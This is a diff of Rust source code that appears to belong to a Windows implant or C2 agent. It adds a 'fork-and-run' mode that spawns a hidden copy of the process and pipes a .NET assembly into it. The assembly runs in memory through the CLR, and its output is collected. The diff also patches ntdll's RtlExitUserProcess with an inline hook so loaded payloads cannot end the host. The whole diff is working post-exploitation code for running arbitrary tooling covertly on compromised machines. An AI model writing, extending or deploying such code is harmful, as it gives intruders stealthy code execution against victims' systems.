@@ -17,9 +17,51 @@ use windows_sys::Win32::{
         LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
         Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE},
         Threading::{CreateThread, ExitThread, WaitForSingleObject},
-        Console::{GetStdHandle, SetStdHandle, STD_OUTPUT_HANDLE, STD_ERROR_HANDLE},
+        Console::{GetStdHandle, SetStdHandle, STD_OUTPUT_HANDLE, STD_ERROR_HANDLE,
+                  STD_INPUT_HANDLE},
     },
 };
+
+// ── Fork-and-run supporting types and extern fns ─────────────────────────────
+
+#[repr(C)]
+struct SecurityAttr { n_length: u32, lp_sd: *mut u8, b_inherit: i32 }
+unsafe impl Send for SecurityAttr {}
+
+#[repr(C)]
+struct StartupInfoW {
+    cb: u32, lp_reserved: *mut u16, lp_desktop: *mut u16, lp_title: *mut u16,
+    dw_x: u32, dw_y: u32, dw_x_size: u32, dw_y_size: u32,
+    dw_x_chars: u32, dw_y_chars: u32, dw_fill: u32, dw_flags: u32,
+    w_show: u16, cb_reserved2: u16, lp_reserved2: *mut u8,
+    h_std_input: isize, h_std_output: isize, h_std_error: isize,
+}
+
+#[repr(C)]
+struct ProcessInfo { h_process: isize, h_thread: isize, dw_pid: u32, dw_tid: u32 }
+
+const HANDLE_FLAG_INHERIT:   u32 = 0x00000001;
+const CREATE_NO_WINDOW:      u32 = 0x08000000;
+const STARTF_USESTDHANDLES:  u32 = 0x00000100;
+const STARTF_USESHOWWINDOW:  u32 = 0x00000001;
+const WAIT_TIMEOUT_VAL:      u32 = 0x00000102;
+
+extern "system" {
+    fn GetModuleFileNameW(h_module: isize, lp_filename: *mut u16, n_size: u32) -> u32;
+    fn CreatePipe(h_read: *mut isize, h_write: *mut isize,
+                  lp_attr: *const core::ffi::c_void, n_size: u32) -> i32;
+    fn SetHandleInformation(h: isize, dw_mask: u32, dw_flags: u32) -> i32;
+    fn SetEnvironmentVariableA(lp_name: *const u8, lp_value: *const u8) -> i32;
+    fn CreateProcessW(lp_app: *const u16, lp_cmd: *mut u16,
+                      lp_pa: *const core::ffi::c_void, lp_ta: *const core::ffi::c_void,
+                      b_inherit: i32, dw_flags: u32,
+                      lp_env: *const core::ffi::c_void, lp_dir: *const u16,
+                      lp_si: *const StartupInfoW, lp_pi: *mut ProcessInfo) -> i32;
+    fn PeekNamedPipe(h: isize, buf: *mut u8, buf_sz: u32, bytes_read: *mut u32,
+                     total_avail: *mut u32, msg_left: *mut u32) -> i32;
+    fn TerminateProcess(h_process: isize, u_exit_code: u32) -> i32;
+    fn GetTickCount() -> u32;
+}
 
 // Raw file I/O and temp-file API — avoids windows-sys feature-path issues.
 extern "system" {
@@ -194,10 +236,25 @@ unsafe extern "system" fn ep_stub(code: u32) { ExitThread(code); }
 
 unsafe fn install_exit_hook() {
     if EP_HOOKED.swap(true, Ordering::SeqCst) { return; }
-    let k32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
-    if k32 == 0 { return; }
-    let addr = match GetProcAddress(k32, b"ExitProcess\0".as_ptr()) {
-        Some(f) => f as *mut u8, None => return,
+    // Patch ntdll!RtlExitUserProcess — the CLR calls this directly
+    let ntdll = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
+    let addr = if ntdll != 0 {
+        match GetProcAddress(ntdll, b"RtlExitUserProcess\0".as_ptr()) {
+            Some(f) => f as *mut u8,
+            None => {
+                let k32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
+                if k32 == 0 { return; }
+                match GetProcAddress(k32, b"ExitProcess\0".as_ptr()) {
+                    Some(f) => f as *mut u8, None => return,
+                }
+            }
+        }
+    } else {
+        let k32 = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
+        if k32 == 0 { return; }
+        match GetProcAddress(k32, b"ExitProcess\0".as_ptr()) {
+            Some(f) => f as *mut u8, None => return,
+        }
     };
     EP_ADDR = addr;
     let stub = ep_stub as usize as u64;
@@ -238,7 +295,7 @@ unsafe extern "system" fn invoke_thread(param: *mut core::ffi::c_void) -> u32 {
 
 // ── Public entry ──────────────────────────────────────────────────────────────
 
-pub fn exec_dotnet(asm_bytes: &[u8], args: &str) -> String {
+pub fn exec_dotnet(asm_bytes: &[u8], args: &str, child_mode: bool) -> String {
     if asm_bytes.len() < 2 { return "[!] dotnet_exec: empty payload".into(); }
     unsafe {
         let Some(oa) = load_oleaut32() else {
@@ -324,17 +381,30 @@ pub fn exec_dotnet(asm_bytes: &[u8], args: &str) -> String {
         }
 
         let sa_params = args_to_param_sa(&oa, args);
-        let (fh_tmp, tmp_path, orig_out, orig_err) = redirect_stdout();
+
+        // Redirect stdout: temp file (normal) or use inherited pipe (child).
+        let (fh_tmp, tmp_path, orig_out, orig_err) = if child_mode {
+            let fh = GetStdHandle(STD_OUTPUT_HANDLE);
+            SetStdHandle(STD_ERROR_HANDLE, fh);
+            (fh, Vec::<u16>::new(), 0isize, 0isize)
+        } else {
+            redirect_stdout()
+        };
 
         let mut work = InvokeArgs { ep: p_ep, sa_params: sa_params, hr: 0 };
-        install_exit_hook();
+        if !child_mode { install_exit_hook(); }
         let ht = CreateThread(ptr::null(), 0, Some(invoke_thread),
             &mut work as *mut _ as _, 0, ptr::null_mut());
         if ht != 0 {
             WaitForSingleObject(ht, 60_000);
             CloseHandle(ht);
         }
-        remove_exit_hook();
+        if !child_mode { remove_exit_hook(); }
+
+        if child_mode {
+            FlushFileBuffers(fh_tmp);
+            std::process::exit(0);
+        }
 
         SetStdHandle(STD_OUTPUT_HANDLE, orig_out);
         SetStdHandle(STD_ERROR_HANDLE, orig_err);
@@ -343,5 +413,184 @@ pub fn exec_dotnet(asm_bytes: &[u8], args: &str) -> String {
         if fh_tmp == INVALID_HANDLE_VALUE { return "(no output captured)".into(); }
         FlushFileBuffers(fh_tmp);
         read_temp_file(fh_tmp, &tmp_path)
+    }
+}
+
+// ── Debug log helper (writes to rust_dotnet_debug.log) ───────────────────────
+
+fn dlog(msg: &str) {
+    use std::io::Write;
+    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true)
+        .open("C:\\Windows\\Temp\\rust_dotnet_debug.log") {
+        let _ = writeln!(f, "{}", msg);
+    }
+}
+
+// ── Fork-and-run: spawn a sacrificial child process to host the CLR ───────────
+
+pub fn fork_run_assembly(asm_bytes: &[u8], args: &str) -> String {
+    unsafe {
+        dlog(&format!("fork_run_assembly: start, asm_len={}, args={:?}", asm_bytes.len(), args));
+        let mut exe = [0u16; MAX_PATH as usize + 1];
+        if GetModuleFileNameW(0, exe.as_mut_ptr(), MAX_PATH) == 0 {
+            dlog("fork_run_assembly: GetModuleFileNameW failed → fallback");
+            return "[!] fork_run: GetModuleFileNameW failed".into();
+        }
+
+        let sa = SecurityAttr {
+            n_length: std::mem::size_of::<SecurityAttr>() as u32,
+            lp_sd: ptr::null_mut(), b_inherit: 1,
+        };
+        let (mut asm_rd, mut asm_wr) = (0isize, 0isize);
+        let sa_ptr = &sa as *const SecurityAttr as *const core::ffi::c_void;
+        if CreatePipe(&mut asm_rd, &mut asm_wr, sa_ptr, 0) == 0 {
+            dlog("fork_run_assembly: CreatePipe(stdin) failed → error");
+            return "[!] fork_run: CreatePipe stdin failed".into();
+        }
+        SetHandleInformation(asm_wr, HANDLE_FLAG_INHERIT, 0);
+
+        let (mut out_rd, mut out_wr) = (0isize, 0isize);
+        if CreatePipe(&mut out_rd, &mut out_wr, sa_ptr, 0) == 0 {
+            dlog("fork_run_assembly: CreatePipe(stdout) failed → error");
+            CloseHandle(asm_rd); CloseHandle(asm_wr);
+            return "[!] fork_run: CreatePipe stdout failed".into();
+        }
+        SetHandleInformation(out_rd, HANDLE_FLAG_INHERIT, 0);
+        dlog("fork_run_assembly: pipes created OK");
+
+        SetEnvironmentVariableA(b"__ENDGAME_CLR_CHILD\0".as_ptr(), b"1\0".as_ptr());
+
+        let si = StartupInfoW {
+            cb: std::mem::size_of::<StartupInfoW>() as u32,
+            lp_reserved: ptr::null_mut(), lp_desktop: ptr::null_mut(),
+            lp_title: ptr::null_mut(), dw_x: 0, dw_y: 0, dw_x_size: 0, dw_y_size: 0,
+            dw_x_chars: 0, dw_y_chars: 0, dw_fill: 0,
+            dw_flags: STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW,
+            w_show: 0, cb_reserved2: 0, lp_reserved2: ptr::null_mut(),
+            h_std_input: asm_rd, h_std_output: out_wr, h_std_error: out_wr,
+        };
+        let mut pi = ProcessInfo { h_process: 0, h_thread: 0, dw_pid: 0, dw_tid: 0 };
+        let ok = CreateProcessW(exe.as_ptr(), ptr::null_mut(),
+                                ptr::null(), ptr::null(),
+                                1, CREATE_NO_WINDOW,
+                                ptr::null(), ptr::null(), &si, &mut pi);
+        SetEnvironmentVariableA(b"__ENDGAME_CLR_CHILD\0".as_ptr(), ptr::null());
+        CloseHandle(asm_rd);
+        CloseHandle(out_wr);
+
+        if ok == 0 {
+            dlog("fork_run_assembly: CreateProcessW failed → error");
+            CloseHandle(asm_wr); CloseHandle(out_rd);
+            return "[!] fork_run: CreateProcessW failed".into();
+        }
+        dlog(&format!("fork_run_assembly: child spawned pid={}", pi.dw_pid));
+
+        // Writer thread: send [4LE args_len][args][4LE asm_len][asm] to child stdin.
+        let asm_clone = asm_bytes.to_vec();
+        let args_clone = args.to_string();
+        let _ = std::thread::spawn(move || unsafe {
+            let mut write_all = |data: &[u8]| {
+                let mut off = 0usize;
+                while off < data.len() {
+                    let mut wr = 0u32;
+                    if WriteFile(asm_wr, data.as_ptr().add(off), (data.len() - off) as u32,
+                                 &mut wr, ptr::null()) == 0 || wr == 0 { break; }
+                    off += wr as usize;
+                }
+            };
+            let ab = args_clone.as_bytes();
+            write_all(&(ab.len() as u32).to_le_bytes());
+            if !ab.is_empty() { write_all(ab); }
+            write_all(&(asm_clone.len() as u32).to_le_bytes());
+            if !asm_clone.is_empty() { write_all(&asm_clone); }
+            CloseHandle(asm_wr);
+        });
+
+        // Read output from child with 60s deadline.
+        let mut output = Vec::<u8>::new();
+        let start_tick = GetTickCount();
+        let mut buf = [0u8; 8192];
+
+        loop {
+            if GetTickCount().wrapping_sub(start_tick) >= 60_000 {
+                TerminateProcess(pi.h_process, 1);
+                if output.is_empty() {
+                    CloseHandle(out_rd);
+                    WaitForSingleObject(pi.h_process, 5000);
+                    CloseHandle(pi.h_process); CloseHandle(pi.h_thread);
+                    return "[!] fork-and-run timeout (60s)".into();
+                }
+                break;
+            }
+            let mut avail = 0u32;
+            if PeekNamedPipe(out_rd, ptr::null_mut(), 0,
+                             ptr::null_mut(), &mut avail, ptr::null_mut()) == 0 { break; }
+            if avail > 0 {
+                let mut nr = 0u32;
+                ReadFile(out_rd, buf.as_mut_ptr(), avail.min(buf.len() as u32), &mut nr, ptr::null());
+                if nr > 0 { output.extend_from_slice(&buf[..nr as usize]); }
+            } else {
+                let r = WaitForSingleObject(pi.h_process, 50);
+                if r != WAIT_TIMEOUT_VAL {
+                    loop {
+                        avail = 0;
+                        if PeekNamedPipe(out_rd, ptr::null_mut(), 0,
+                                         ptr::null_mut(), &mut avail, ptr::null_mut()) == 0
+                            || avail == 0 { break; }
+                        let mut nr = 0u32;
+                        ReadFile(out_rd, buf.as_mut_ptr(), avail.min(buf.len() as u32), &mut nr, ptr::null());
+                        if nr == 0 { break; }
+                        output.extend_from_slice(&buf[..nr as usize]);
+                    }
+                    break;
+                }
+            }
+        }
+
+        CloseHandle(out_rd);
+        WaitForSingleObject(pi.h_process, 5000);
+        CloseHandle(pi.h_process); CloseHandle(pi.h_thread);
+
+        dlog(&format!("fork_run_assembly: done, output_bytes={}", output.len()));
+        if output.is_empty() { return "(no output from child)".into(); }
+        String::from_utf8_lossy(&output).into_owned()
+    }
+}
+
+// ── Child entry: read protocol from stdin, run CLR via pipe, exit ─────────────
+
+pub fn clr_child_run() {
+    dlog("clr_child_run: entered");
+    unsafe {
+        let h_in = GetStdHandle(STD_INPUT_HANDLE);
+
+        let mut read_exact = |buf: &mut [u8]| -> bool {
+            let mut off = 0usize;
+            while off < buf.len() {
+                let mut rd = 0u32;
+                if ReadFile(h_in, buf.as_mut_ptr().add(off), (buf.len() - off) as u32,
+                            &mut rd, ptr::null()) == 0 || rd == 0 { return false; }
+                off += rd as usize;
+            }
+            true
+        };
+
+        let mut hdr = [0u8; 4];
+        if !read_exact(&mut hdr) { std::process::exit(1); }
+        let args_len = u32::from_le_bytes(hdr) as usize;
+
+        let mut args_bytes = vec![0u8; args_len];
+        if args_len > 0 && !read_exact(&mut args_bytes) { std::process::exit(1); }
+        let args_str = String::from_utf8_lossy(&args_bytes).into_owned();
+
+        if !read_exact(&mut hdr) { std::process::exit(1); }
+        let asm_len = u32::from_le_bytes(hdr) as usize;
+
+        let mut asm_buf = vec![0u8; asm_len];
+        if asm_len > 0 && !read_exact(&mut asm_buf) { std::process::exit(1); }
+
+        dlog(&format!("clr_child_run: executing dotnet asm_len={} args={:?}", asm_buf.len(), args_str));
+        exec_dotnet(&asm_buf, &args_str, true); // calls std::process::exit(0) internally
+        std::process::exit(0);
     }
 }
